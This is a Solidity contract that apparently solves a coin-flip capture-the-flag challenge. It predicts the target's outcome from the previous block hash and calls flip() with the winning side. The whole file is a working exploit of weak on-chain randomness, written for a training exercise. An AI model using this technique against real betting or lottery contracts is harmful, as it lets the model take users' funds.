// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import"./CoinFlip.sol";

contract Attack {

    CoinFlip public coinFlipContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address coinFlipAddress) public{
        coinFlipContract = CoinFlip(coinFlipAddress);
    }

    function attack() public returns (bool){
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
    }

}
